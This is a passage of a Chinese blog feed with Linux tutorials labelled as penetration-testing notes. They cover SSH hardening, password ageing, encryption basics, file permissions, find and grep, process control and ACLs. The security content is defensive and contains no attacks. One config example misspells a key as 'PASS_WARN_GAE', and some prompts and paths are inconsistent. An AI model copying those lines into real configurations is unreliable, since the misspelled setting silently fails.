class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/ssh/sshd_config</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Port</span> <span class="string">12345                          //修改默认连接端口为12345</span></span><br><span class="line"><span class="attr">LoginGraceTime</span> <span class="string">1m                   //修改用户登录验证过程的时长1分钟</span></span><br><span class="line"><span class="attr">PermitRootLogin</span> <span class="string">no                  //禁止root远程登录（不影响sudo提权）</span></span><br><span class="line"><span class="attr">MaxAuthTries</span> <span class="string">2                      //单次连接最多重试2次验证</span></span><br><span class="line"><span class="attr">AllowUsers</span> <span class="string">zhangsan@192.168.10.224</span></span><br><span class="line"><span class="attr">//添加白名单，仅允许zhangsan用户在192.168.10.224上访问</span></span><br><span class="line"></span><br><span class="line"><span class="attr">/etc/init.d/ssh</span> <span class="string">restart            //重启试试服务器</span></span><br></pre></td></tr></table></figure><h3 id="命令行超时限制"><a href="#命令行超时限制" class="headerlink" title="命令行超时限制"></a>命令行超时限制</h3><p><strong>针对后续登录的所有用户</strong></p><ul><li>调整&#x2F;etc&#x2F;profile文件中的TMOUT变量值</li></ul><p><strong>针对通过SSH登录的用户</strong></p><ul><li>调整&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件中的ClientAliveInterval值</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/profile</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">TMOUT=300       //闲置300秒自动退出</span></span><br></pre></td></tr></table></figure><h3 id="密码有效期限"><a href="#密码有效期限" class="headerlink" title="密码有效期限"></a>密码有效期限</h3><p><strong>调整&#x2F;etc&#x2F;login.defs配置文件</strong></p><ul><li>此文件定义了useradd的默认设置，会影响后续新创建的用户</li><li>若有需要，也可用chage命令直接设置特定用户的密码参数</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/login.defs              //设置新建用户时的默认密码有效期</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PASS_MAX_DAYS</span> <span class="string">90                 //密码有效天数</span></span><br><span class="line"><span class="attr">PASS_WARN_GAE</span> <span class="string">7                  //密码过期前警告天数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">chage</span> <span class="string">-M 180 root              //设置root用户密码有效期为180天</span></span><br><span class="line"><span class="attr">chage</span> <span class="string">-l root</span></span><br></pre></td></tr></table></figure><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p><strong>对称加密</strong></p><ul><li>加密和解密速度快，效率高</li><li>加密和解密使用相同的密钥，所以叫对称加密</li><li>对称加密包含多种算法，如：DES、3DES、AES</li><li>加密长度一般小于256位</li><li>防止数据泄露</li></ul><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p><strong>非对称加密（密钥对）</strong></p><ul><li>由公钥和私钥组成，两个密钥相互加密和解密</li><li>用公钥对数据进行加密，用对应的私钥才能解密</li><li>用私钥对数据进行加密，用对应的公钥才能解密</li><li>非对称加密常用算法：RSA、DSA(数字签名算法</li><li>加密长度一般为512、1024、2048等</li><li>加密和解密速度较慢</li></ul><h3 id="密码对访问Linux"><a href="#密码对访问Linux" class="headerlink" title="密码对访问Linux"></a>密码对访问Linux</h3><p><strong>用MobaXterm新建本地终端</strong></p><p><img src="/../img/img_artical/net_sec/10.4.3.png" alt="10.4.3"></p><p><strong>检查原来是否生成过秘钥文件，如果有删除即可</strong></p><p><img src="/../img/img_artical/net_sec/10.4.4.png" alt="10.4.4"></p><p><strong>第一步：创建秘钥对</strong></p><ul><li>使用MobaXterm生成公钥、私钥</li></ul><p><img src="/../img/img_artical/net_sec/10.4.5.png" alt="10.4.5"></p><ul><li>公私钥保存位置</li></ul><p><img src="/../img/img_artical/net_sec/10.4.6.png" alt="10.4.6"></p><p><strong>第二步：拷贝公钥到Linux系统</strong></p><p><img src="/../img/img_artical/net_sec/10.4.7.png" alt="10.4.7"></p><ul><li>在Linux中验证是否上传成功</li></ul><p><img src="/../img/img_artical/net_sec/10.4.8.png" alt="10.4.8"></p><p><strong>第三步：修改配置文件，禁止使用密码登录Linux系统</strong></p><p><img src="/../img/img_artical/net_sec/10.4.9.png" alt="10.4.9"></p><ul><li>重启SSH服务</li></ul><p><img src="/../img/img_artical/net_sec/10.4.10.png" alt="10.4.10"></p><p><strong>第四步：在MobaXterm中，使用SSH连接目标主机</strong></p><p><img src="/../img/img_artical/net_sec/10.4.11.png" alt="10.4.11"></p><h3 id="其他加固措施"><a href="#其他加固措施" class="headerlink" title="其他加固措施"></a>其他加固措施</h3><ul><li>系统服务加固：SSH&#x2F;WEB&#x2F;数据库&#x2F;FTP等</li><li>文件权限：rwx控制&#x2F;删除无主文件&#x2F;删除空链接&#x2F;umask调整</li><li>内核参数：禁ping&#x2F;禁转发&#x2F;禁ICMP重定向&#x2F;SYN cookie保护</li><li>SELinux策略：强保护&#x2F;服务策略&#x2F;端口策略&#x2F;安全上下文</li><li>授权认证：远程限制&#x2F;GRUB加密&#x2F;禁止交互启动</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Linux渗透测试3</title>
      <link href="/posts/lnxpte3.html"/>
      <url>/posts/lnxpte3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="归属控制"><a href="#归属控制" class="headerlink" title="归属控制"></a>归属控制</h2><h3 id="访问控制概述"><a href="#访问控制概述" class="headerlink" title="访问控制概述"></a>访问控制概述</h3><p><strong>文档归属（是谁的？）</strong></p><ul><li>属主：拥有此文件&#x2F;目录的用户  - user</li><li>属组：拥有此文件&#x2F;目录的组  - group</li><li>其他用户：除所有者、所属组以外的用户  - other</li></ul><p><strong>访问权限 （能被怎么用？）</strong></p><ul><li>读取：允许查看内容  - read</li><li>写入：允许修改内容  - write</li><li>可执行：允许运行和切换  - execute</li></ul><h3 id="查看Linux文档的归属"><a href="#查看Linux文档的归属" class="headerlink" title="查看Linux文档的归属"></a>查看Linux文档的归属</h3><p><strong>执行ls -l命令查看</strong></p><ul><li>输出信息包括7个字段</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -l</span></span><br><span class="line"><span class="attr">总用量</span> <span class="string">8</span></span><br><span class="line"><span class="attr">-rw-------.</span>    <span class="string">1        root  root 1179 12月 28 11:06 anaconda-ks.cfg</span></span><br><span class="line">   <span class="attr">权限位</span>     <span class="string">硬连接数     属主   属组 大小   最后修改时间    文件/目录名称</span></span><br></pre></td></tr></table></figure><h3 id="更改文档归属"><a href="#更改文档归属" class="headerlink" title="更改文档归属"></a>更改文档归属</h3><p><strong>chown命令</strong></p><ul><li>格式：chown  属主  文档</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# useradd zhangsan         //创建用户</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# useradd lisi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -ldh /home/zhangsan              //查看目录归属</span></span><br><span class="line"><span class="attr">drwx------.</span> <span class="string">2 zhangsan zhangsan 4.0K  1月  2 09:49 /home/zhangsan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# chown lisi /home/zhangsan       //修改目录属主为lisi</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -ldh /home/zhangsan          //再次查看目录归属</span></span><br><span class="line"><span class="attr">drwx------.</span> <span class="string">2 lisi zhangsan 4.0K  1月  2 09:49 /home/zhangsan</span></span><br></pre></td></tr></table></figure><p><strong>chown命令</strong></p><ul><li>格式：chown  属主:属组  文档</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# chown :lisi /home/zhangsan         //修改目录属组为lisi</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -ldh /home/zhangsan             //查看目录信息</span></span><br><span class="line"><span class="attr">drwx------.</span> <span class="string">2 lisi lisi 4.0K  1月  2 09:49 /home/zhangsan</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@tedu</span> <span class="string">~]# chown zhangsan:zhangsan /home/zhangsan          //恢复原状</span></span><br><span class="line"><span class="attr">[root@tedu</span> <span class="string">~]# ls -ldh /home/zhangsan/</span></span><br><span class="line"><span class="attr">drwx------.</span> <span class="string">2 zhangsan zhangsan 4.0K  1月  2 09:49 /home/zhangsan/</span></span><br></pre></td></tr></table></figure><h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><h3 id="rwx权限的作用"><a href="#rwx权限的作用" class="headerlink" title="rwx权限的作用"></a>rwx权限的作用</h3><table><thead><tr><th align="center">权限</th><th align="center">文件</th><th align="center">目录</th></tr></thead><tbody><tr><td align="center">r（read）</td><td align="center">查看文件内容</td><td align="center">查看目录下的文件与目录名称</td></tr><tr><td align="center">w（write）</td><td align="center">修改文件内容</td><td align="center">在目录下增删文档，对文档复制移动改名<br />（一般需要w和x权限）</td></tr><tr><td align="center">x（execute）</td><td align="center">可以执行文件<br />（文件一般为可执行文件）</td><td align="center">可以使用cd命令切换进此目录</td></tr></tbody></table><h3 id="更改访问权限"><a href="#更改访问权限" class="headerlink" title="更改访问权限"></a>更改访问权限</h3><p><strong>chmod命令</strong></p><ul><li>格式：chomod  [ugo]  [+-&#x3D;]  [rwx]  文档路径</li><li>ugo<ul><li>u：属主权限</li><li>g：属组权限</li><li>o：其他用户权限</li></ul></li><li>+-&#x3D;<ul><li>+：加权限</li><li>-：减权限</li><li>&#x3D;：赋予权限</li></ul></li><li>rwx<ul><li>r：读权限</li><li>w：写权限</li><li>x：执行权限</li></ul></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mkdir public</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# chown :lisi public</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# chmod g+rwx,o-rx public</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ll public/</span></span><br><span class="line"><span class="attr">总用量</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -ldh public/</span></span><br><span class="line"><span class="attr">drwxrwx---.</span> <span class="string">2 root lisi 4.0K  1月  2 10:06 public/</span></span><br></pre></td></tr></table></figure><p><strong>chmod命令</strong></p><ul><li>简化格式：chmod  [000~777]  文档路径</li><li>000~777：每位数分别代表属主、属组、其他用户</li><li>数字转化为二进制，1为有权限，0为无权限，三位分别代表rwx</li><li>例如：777代表111&#x2F;111&#x2F;111，赋予所有权限，770代表111&#x2F;111&#x2F;000，赋予属主和属组所有权限，其他用户不赋予权限</li></ul><h2 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h2><h3 id="find按条件查找文件"><a href="#find按条件查找文件" class="headerlink" title="find按条件查找文件"></a>find按条件查找文件</h3><p><strong>用法：find  [目录]  [条件]</strong></p><ul><li>在指定目录下查找符合特定条件的文档</li></ul><p><strong>条件如何表示</strong></p><ul><li>-name  文件名：指定文档名称，允许使用通配符*</li><li>-size  +|-  大小：指定文档大小（带单位kMG），+|-号表示超过|低于</li><li>-type  类型：指定文档类型，f普通文档、d目录、l链接文件</li><li>-mtime  +|-  天数：指定最近修改日期，+|-号表示超过|低于</li><li>-user  用户名：指定文档属主</li><li>-perm  [-ufo] &#x3D; [rwx]：指定权限</li><li>-a：用于连接多个条件，表示并且（-a可省略）</li><li>-o：用于连接多个条件，表示或者</li></ul><h3 id="find应用示例"><a href="#find应用示例" class="headerlink" title="find应用示例"></a>find应用示例</h3><p><strong>查找系统根目录下名为vim的文件</strong></p><ul><li>find  &#x2F;  -name  vim  -type  f</li></ul><p><strong>查找系统根目录下以.conf结尾的所有文件</strong></p><ul><li>find  &#x2F;  -name  *.conf  -type  f</li></ul><p><strong>查找&#x2F;boot&#x2F;目录下大小超过10M的文件</strong></p><ul><li>find  &#x2F;boot  -size  +10M  -type  f</li></ul><p><strong>查找&#x2F;var&#x2F;log目录下超过30天都没有改动过的文件</strong></p><ul><li>find  &#x2F;var&#x2F;log&#x2F;  -mtime  +30  -type  f</li></ul><p><strong>查找系统根目录下属主为zhangsan的文档</strong></p><ul><li>find  &#x2F;  -user  zhangsan</li></ul><p><strong>查找系统根目录下其他用户具有执行权限的文件</strong></p><ul><li>find  &#x2F;  -perm  -o&#x3D;x  -type  f</li></ul><p><strong>查找&#x2F;boot&#x2F;目录下大小超过10M或者小于1M的文件</strong></p><ul><li>find  &#x2F;boot  -size  +10M  -o  -size  -1M  -type  f</li></ul><h2 id="文本过滤"><a href="#文本过滤" class="headerlink" title="文本过滤"></a>文本过滤</h2><h3 id="管道操作"><a href="#管道操作" class="headerlink" title="管道操作"></a>管道操作</h3><p><strong>命令行的管道操作</strong></p><p><strong>用法：命令1|命令2</strong></p><ul><li>把命令1的正常显示结果先交给命令2，等命令2处理后再显示</li><li>命令2必须能接收并处理文本（比如less、grep、wc等），否则没有意义</li><li>who：显示正在登录的用户</li><li>wc  -l：统计内容的行数</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# find / | less             //查找根下所有文档并分页显示</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# who | wc -l          //统计当前已登录的用户数</span></span><br><span class="line"><span class="attr">1</span></span><br></pre></td></tr></table></figure><h3 id="grep文本过滤"><a href="#grep文本过滤" class="headerlink" title="grep文本过滤"></a>grep文本过滤</h3><p><strong>从文件内容中查找关键词</strong></p><p><strong>用法：grep  [-iv]  “关键词”  文件</strong></p><ul><li>仅输出文件中包含“关键词”的行</li><li>选项-i表示忽略大小写，选项-v表示把条件反过来（不包含关键词）</li><li>使用“^ab”查找以ab开头的行，“ab$”查找以ab结尾的行</li><li>#代表注释，被注释的配置不会生效</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep &quot;root&quot; /etc/passwd                 //列出包含root的列</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep -i &quot;root&quot; /etc/passwd              //列出包含root的列，忽略大小写</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep -v &quot;root&quot; /etc/passwd              //列出不包含root的列</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep &quot;^#&quot; /etc/selinux/config           //列出被注释的行</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep -v &quot;^#&quot; /etc/selinux/config        //列出没有被注释的行</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep &quot;^$&quot; /etc/selinux/config           //列出空行</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# grep -v &quot;^$&quot; /etc/selinux/config        //列出非空行</span></span><br></pre></td></tr></table></figure><h3 id="从命令结果中查找关键词"><a href="#从命令结果中查找关键词" class="headerlink" title="从命令结果中查找关键词"></a>从命令结果中查找关键词</h3><p><strong>用法：命令行|grep  [-iv]  “关键词”</strong></p><ul><li>结合管道操作，针对命令显示结果进行过滤，提取重要信息</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ifconfig | grep 192.168.10.223                 //查看IP参数中包含目标地址的行</span></span><br></pre></td></tr></table></figure><h2 id="进程管控"><a href="#进程管控" class="headerlink" title="进程管控"></a>进程管控</h2><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><p><strong>程序vs进程</strong></p><p><img src="/../img/img_artical/net_sec/10.3.1.png" alt="10.3.1"></p><p><strong>top查看进程</strong></p><p><strong>用法：top</strong></p><ul><li>动态显示系统负载及资源占用排名，类似“任务管理器“</li><li>资源消耗越多的进程越靠前，按q 键退出</li></ul><h3 id="查找-杀死进程"><a href="#查找-杀死进程" class="headerlink" title="查找&#x2F;杀死进程"></a>查找&#x2F;杀死进程</h3><p><strong>pgrep查找进程</strong></p><p><strong>用法：pgrep  [-l]  关键词</strong></p><ul><li>列出名称中包含关键词的进程的进程号</li><li>选项-l可以一起列出进程名</li></ul><p><strong>杀死进程</strong></p><p><strong>用法：pkill  [-9]  进程关键词</strong></p><p><strong>或kill  [-9]  进程号</strong></p><ul><li>杀死名称中包含关键词的进程或进程号对应的进程</li><li>选项-9表示强制杀死进程</li></ul><h2 id="ACL访问控制"><a href="#ACL访问控制" class="headerlink" title="ACL访问控制"></a>ACL访问控制</h2><h3 id="认识ACL策略"><a href="#认识ACL策略" class="headerlink" title="认识ACL策略"></a>认识ACL策略</h3><p><strong>为文档定义访问规则，针对除u、g、o以外的个别用户或组</strong></p><ul><li>文档的属主&#x2F;属组标记，把访问者区分为三类一一属主、属组、其他人</li><li>但“其他人“中还有张三李四，如何再区分权限?</li></ul><p><img src="/../img/img_artical/net_sec/10.3.2.png" alt="10.3.2"></p><h3 id="getfacl查看ACL策略"><a href="#getfacl查看ACL策略" class="headerlink" title="getfacl查看ACL策略"></a>getfacl查看ACL策略</h3><p><strong>用法：getfacl  文档路径</strong></p><ul><li>可以列出文档归属，以及各类用户对此文档的访问权限</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# getfacl /root</span></span><br><span class="line"><span class="attr">getfacl</span>: <span class="string">Removing leading &#x27;/&#x27; from absolute path names</span></span><br><span class="line"><span class="comment"># file: root</span></span><br><span class="line"><span class="comment"># owner: root</span></span><br><span class="line"><span class="comment"># group: root</span></span><br><span class="line"><span class="attr">user</span>:<span class="string">:r-x                //属主权限</span></span><br><span class="line"><span class="attr">group</span>:<span class="string">:r-x               //属组权限</span></span><br><span class="line"><span class="attr">other</span>:<span class="string">:---               //其他用户权限</span></span><br></pre></td></tr></table></figure><h3 id="setfacl配置ACL策略"><a href="#setfacl配置ACL策略" class="headerlink" title="setfacl配置ACL策略"></a>setfacl配置ACL策略</h3><ul><li>用法1：setfacl  -m  user:用户名：权限组合  文档</li><li>用法2：setfacl  -m  group:组名：权限组合  文档</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# setfacl -m u:zhangsan:rx /root      //增加acl，使张三对/root目录有读取与执行权限</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# getfacl /root                       //查看acl</span></span><br><span class="line"><span class="attr">user</span>:<span class="string">:r-x</span></span><br><span class="line"><span class="attr">user</span>:<span class="string">zhangsan:r-x</span></span><br><span class="line"><span class="attr">group</span>:<span class="string">:r-x</span></span><br><span class="line"><span class="attr">mask</span>:<span class="string">:r-x</span></span><br><span class="line"><span class="attr">other</span>:<span class="string">:---</span></span><br></pre></td></tr></table></figure><h3 id="setfacl删除ACL策略"><a href="#setfacl删除ACL策略" class="headerlink" title="setfacl删除ACL策略"></a>setfacl删除ACL策略</h3><ul><li>用法1：setfacl  -x  user:用户名  文档：删除用户策略</li><li>用法2：setfacl  -x  group:组名  文档：删除组策略</li><li>用法3：setfacl  -b  文档：清空所有策略</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Linux渗透测试2</title>
      <link href="/posts/lnxpte2.html"/>
      <url>/posts/lnxpte2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="目录-文件基本管理"><a href="#目录-文件基本管理" class="headerlink" title="目录&#x2F;文件基本管理"></a>目录&#x2F;文件基本管理</h2><h3 id="查看目录、查看文件"><a href="#查看目录、查看文件" class="headerlink" title="查看目录、查看文件"></a>查看目录、查看文件</h3><p><strong>ls列目录及文档属性</strong></p><p>**ls **</p><ul><li>格式：ls [选项] … [目录或文件路径]</li></ul><p><strong>常用命令选项</strong></p><ul><li>-A：列出目录内文档（包含.开头的隐藏文档）</li><li>-a：列出目录内所有文档（包含隐藏文档及.和..）</li><li>-l：以长格式显示（详细信息）</li><li>-h：带容量单位（一般与-l一起使用）</li><li>-d：如果目标是目录，只列出目录本身（不包含目录下内容）</li></ul><p><strong>cat&#x2F;less 查看文件内容</strong></p><p><strong>cat：显示文件的全部内容</strong></p><ul><li>格式：cat [文件路径] …</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# cat /etc/services</span></span><br></pre></td></tr></table></figure><p><strong>less：分页显示</strong></p><ul><li>按PgUp&#x2F;PgDn翻页、按q键退出</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# less /etc/services</span></span><br></pre></td></tr></table></figure><h3 id="创建目录、空文件"><a href="#创建目录、空文件" class="headerlink" title="创建目录、空文件"></a>创建目录、空文件</h3><p><strong>mkdir创建目录</strong></p><p><strong>mkdir（make directory）</strong></p><ul><li>格式：mkdir [-p] [&#x2F;路径&#x2F;] 目录名…</li><li>-p：创建目录时连同父目录一起创建</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mkdir -p /ntd/pentest</span></span><br><span class="line"><span class="attr">//因为pentest的父目录ntd不存在，所以使用-p一起创建</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /ntd</span></span><br><span class="line"><span class="attr">pentest</span></span><br></pre></td></tr></table></figure><p><strong>touch创建文件</strong></p><p><strong>touch：创建指定的空文件，一般仅用作测试</strong></p><ul><li>格式：touch 文件名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# cd /ntd/pentest               //切换到/ntd/pentest目录</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">pentest]# touch password.txt      //创建password.txt文件</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">pentest]# ls -lh                  //查看当前目录下的所有文档详细信息</span></span><br><span class="line"><span class="attr">-rW-r--r--</span> <span class="string">1 root root 0 11月 2 09:55 password.txt</span></span><br></pre></td></tr></table></figure><h2 id="目录-文件进阶操作"><a href="#目录-文件进阶操作" class="headerlink" title="目录&#x2F;文件进阶操作"></a>目录&#x2F;文件进阶操作</h2><h3 id="复制、移动、删除"><a href="#复制、移动、删除" class="headerlink" title="复制、移动、删除"></a>复制、移动、删除</h3><p><strong>cp复制文档</strong></p><p><strong>cp（copy）</strong></p><ul><li>格式：cp [选项] 原文件 目标路径</li></ul><p><strong>常用命令选项</strong></p><ul><li>-r：递归，复制目录时必须有此选项</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# cp -r /boot/grub2/ /ntd</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls -l ntd</span></span><br><span class="line"><span class="attr">drwx------</span> <span class="string">5 root root 4096 11月 2 11:31 grub2</span></span><br><span class="line"><span class="attr">drwxr-xr-x</span> <span class="string">2 root root 4096 11月 20 9:55 pentst</span></span><br></pre></td></tr></table></figure><p><strong>mv移动&#x2F;改名文档</strong></p><p><strong>mv（move）</strong></p><ul><li>格式：mv [选项] 原文档 目标路径&#x2F;[新文档名]</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mkdir /backup</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mv /ntd/pentest/password.txt /backup/pass.txt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@svr223~]#</span> <span class="string">ls /backup/</span></span><br><span class="line"><span class="attr">pass.txt</span></span><br></pre></td></tr></table></figure><p><strong>rm删除文档</strong></p><p><strong>rm（remove）</strong></p><ul><li>格式：rm [选项] 文件或目录</li></ul><p><strong>常用命令选项</strong></p><ul><li>-r：递归删除（含目录）</li><li>-f：强制删除</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# rm -rf /backup                //制递归删除，并且不进行删除询问</span></span><br></pre></td></tr></table></figure><h3 id="vim文本编辑"><a href="#vim文本编辑" class="headerlink" title="vim文本编辑"></a>vim文本编辑</h3><p><strong>vi与vim</strong></p><ul><li>vi，Virsual Interface – Linux&#x2F;Unix默认编辑器</li><li>vim，Vi Improved – vi编辑器的增强版</li></ul><p><img src="/../img/img_artical/net_sec/10.2.1.png" alt="10.2.1"></p><p><strong>vim编辑器的工作模式</strong></p><ul><li>三种“变身”状态</li></ul><p><img src="/../img/img_artical/net_sec/10.1.2.png" alt="10.1.2"></p><h2 id="用户账号管理"><a href="#用户账号管理" class="headerlink" title="用户账号管理"></a>用户账号管理</h2><h3 id="关于用户账号"><a href="#关于用户账号" class="headerlink" title="关于用户账号"></a>关于用户账号</h3><p><strong>用户的作用</strong></p><ul><li>作为登录系统的凭据</li><li>作为访问文档、进程等资源的身份凭据</li></ul><p><strong>用户类型</strong></p><ul><li>超级用户（ID为0）</li><li>系统用户（不能登录，ID为1-999）</li><li>普通用户（ID为1000~60000）</li></ul><p><strong>普通用户的主要属性</strong></p><ul><li>登录名、密码、家目录（&#x2F;home&#x2F;用户名）</li></ul><h3 id="添加新用户"><a href="#添加新用户" class="headerlink" title="添加新用户"></a>添加新用户</h3><p><strong>useradd 命令</strong></p><ul><li>格式：useradd   用户名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# useradd nvshen</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# id nvshen     //检查用户ID信息</span></span><br><span class="line"><span class="attr">uid</span>=<span class="string">1004(nvshen)gid=1004(nvshen)组=1004(nvshen)</span></span><br></pre></td></tr></table></figure><h3 id="为用户设置密码"><a href="#为用户设置密码" class="headerlink" title="为用户设置密码"></a>为用户设置密码</h3><p><strong>passwd命令</strong></p><ul><li>格式：passwd [用户名]</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 